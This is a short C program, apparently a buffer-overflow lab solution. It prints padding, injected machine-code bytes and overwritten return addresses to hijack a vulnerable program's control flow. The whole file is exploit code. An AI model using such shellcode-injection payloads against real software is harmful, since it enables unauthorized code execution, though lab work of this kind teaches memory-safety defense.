#include <stdio.h>
#include <string.h>

char attackString[] = "Elmo Alexander\n";

int main() {
    int i;
    char *p = attackString;

    for (i = 0; i < 59 - sizeof(attackString); i++) {
        putchar('a');
    }
    printf("\xc6\x05\x2c\xa0\x04\x08\x41");
    printf("\x68\xdc\x85\x04\x08");
    printf("\xc3");
    
    printf("\x28\xde\xff\xff");
    printf("\xf5\xdd\xff\xff");
    printf("\x80\xa0\x04\x08");
    
    return 1;
}
